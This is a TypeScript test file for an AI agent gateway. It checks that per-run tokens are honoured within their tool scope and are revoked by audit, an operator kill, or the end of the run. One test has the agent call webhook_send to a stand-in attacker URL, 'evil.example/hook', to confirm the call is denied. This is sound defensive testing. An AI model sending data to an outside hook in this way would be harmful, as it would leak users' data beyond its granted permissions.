import Fastify from "fastify";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { AgentService } from "./agent-service.js";
import { loadConfig } from "./config.js";
import { gatewayPlugin, makeJwtVerifier } from "./gateway.js";
import { JsonStore } from "./store.js";
import type { AgentRunner, RunnerRequest, RunnerResult, Scope } from "./types.js";
import { WorkspaceManager } from "./workspace.js";

/**
 * Link 1 to link 4 of the demo chain: the token AgentService mints for a run is the
 * one the gateway accepts, and the row behind it is what enforcement actually reads.
 * Everything here goes through the real signer and the real gateway plugin — only the
 * Codex process is faked.
 */

const SECRET = "test-secret-at-least-32-bytes-long-ok";
const temporaryDirectories: string[] = [];

afterEach(async () => {
  await Promise.all(
    // Best-effort, for the reason `cleanupHarnesses` spells out: this file
    // asserts mid-run, so the store is still writing when the test ends and a
    // plain recursive delete races it to ENOTEMPTY.
    temporaryDirectories.splice(0).map((directory) =>
      rm(directory, { recursive: true, force: true, maxRetries: 5, retryDelay: 20 }).catch(
        () => undefined,
      ),
    ),
  );
});

/**
 * Holds the run open the way a real Codex process does, because that is the only window
 * in which an agent makes tool calls: the token is revoked when the run ends.
 */
class HangingRunner implements AgentRunner {
  request: RunnerRequest | null = null;
  private release!: (result: RunnerResult) => void;
  private readonly pending = new Promise<RunnerResult>((resolve) => {
    this.release = resolve;
  });
  async run(request: RunnerRequest): Promise<RunnerResult> {
    this.request = request;
    return this.pending;
  }
  finish(): void {
    this.release({ output: "done", threadId: "fake-thread", usage: null });
  }
  async cancel(): Promise<boolean> {
    return false;
  }
  async isAvailable(): Promise<boolean> {
    return true;
  }
}

async function mintedTokenFor(tools: Scope[]) {
  const root = await mkdtemp(path.join(tmpdir(), "run-identity-"));
  temporaryDirectories.push(root);
  const workspaceRoot = path.join(root, "workspaces");
  const config = loadConfig({
    NODE_ENV: "test",
    APP_DATA_DIR: path.join(root, "data"),
    AGENT_WORKSPACE_ROOT: workspaceRoot,
    CODEX_HOME: path.join(root, "codex"),
    ARK_API_KEY: "test-key",
    ARK_MODEL: "ep-test",
    JWT_SECRET: SECRET,
  });
  const store = new JsonStore(path.join(root, "data", "db.json"));
  const runner = new HangingRunner();
  const service = new AgentService(
    config,
    store,
    new WorkspaceManager(workspaceRoot),
    runner,
  );
  await service.initialize();

  const agent = await service.createAgent({ name: "Researcher", permissions: { tools } });
  const { run } = await service.sendMessage(agent.id, "read my notes");
  // The run is still in flight here, which is when tool calls arrive.
  await expect.poll(() => runner.request !== null).toBe(true);
  await writeFile(path.join(workspaceRoot, agent.id, "notes.md"), "my own notes", "utf8");

  const app = Fastify();
  await app.register(gatewayPlugin, {
    store,
    workspaceRoot,
    verifyAgentToken: makeJwtVerifier(SECRET),
  });
  return { app, store, service, agent, runner, token: runner.request?.token ?? "", run };
}

async function call(
  app: ReturnType<typeof Fastify>,
  jwt: string,
  tool: string,
  args: Record<string, unknown>,
) {
  const res = await app.inject({
    method: "POST",
    url: "/mcp",
    headers: {
      "content-type": "application/json",
      accept: "application/json, text/event-stream",
      authorization: "Bearer " + jwt,
    },
    payload: { jsonrpc: "2.0", id: 1, method: "tools/call", params: { name: tool, arguments: args } },
  });
  if (res.statusCode !== 200) return { status: res.statusCode, text: res.body, isError: true };
  const body = res.json() as {
    result?: { content: { text: string }[]; isError?: boolean };
    error?: { message: string };
  };
  return {
    status: 200,
    text: body.result?.content[0]?.text ?? body.error?.message ?? "",
    isError: body.result?.isError ?? !!body.error,
  };
}

describe("a minted run identity at the gateway", () => {
  it("is accepted for a tool inside its scope", async () => {
    const { app, token, agent } = await mintedTokenFor(["workspace:read"]);
    const result = await call(app, token, "workspace_read", {
      agent: agent.id,
      path: "notes.md",
    });
    expect(result.isError).toBe(false);
    expect(result.text).toContain("my own notes");
  });

  it("is denied for a tool outside its scope, and the denial is audited", async () => {
    const { app, store, token } = await mintedTokenFor(["workspace:read"]);
    const result = await call(app, token, "webhook_send", {
      url: "https://evil.example/hook",
      body: "anything",
    });
    expect(result.isError).toBe(true);
    // webhook_send also fails closed while B2's sink is unwired, so pin the reason:
    // this has to be the scope check firing, not a missing dependency.
    const denials = store
      .snapshot()
      .runEvents.filter((event) => event.decision === "deny");
    expect(denials).toHaveLength(1);
    expect(denials[0]?.reason).toMatch(/scope/i);
  });

  it("stops working the moment its row is revoked, same token", async () => {
    const { app, store, token, agent } = await mintedTokenFor(["workspace:read"]);
    const args = { agent: agent.id, path: "notes.md" };
    expect((await call(app, token, "workspace_read", args)).isError).toBe(false);

    await store.mutate((database) => {
      database.runTokens[0]!.revokedAt = new Date().toISOString();
    });

    // The JWT is unchanged and still unexpired. The row is the authority.
    expect((await call(app, token, "workspace_read", args)).isError).toBe(true);
  });

  it("stops working the moment the operator hits Kill, mid-run", async () => {
    const { app, store, service, token, agent, runner } =
      await mintedTokenFor(["workspace:read"]);
    const args = { agent: agent.id, path: "notes.md" };
    expect((await call(app, token, "workspace_read", args)).isError).toBe(false);

    // Scene 5's other half: the run is still open — `runner` has not finished —
    // and the operator kills the identity out from under it.
    await service.killAgent(agent.id, "user-jean");

    const refused = await call(app, token, "workspace_read", args);
    expect(refused.isError).toBe(true);
    expect(store.snapshot().runEvents.at(-1)).toMatchObject({
      decision: "deny",
      reason: "revoked",
    });
    runner.finish();
  });

  it("stops working once the run it belongs to has ended", async () => {
    const { app, store, token, agent, runner } = await mintedTokenFor(["workspace:read"]);
    const args = { agent: agent.id, path: "notes.md" };
    expect((await call(app, token, "workspace_read", args)).isError).toBe(false);

    runner.finish();
    await expect.poll(() => store.snapshot().runTokens[0]?.revokedAt).toBeTruthy();

    expect((await call(app, token, "workspace_read", args)).isError).toBe(true);
  });
});
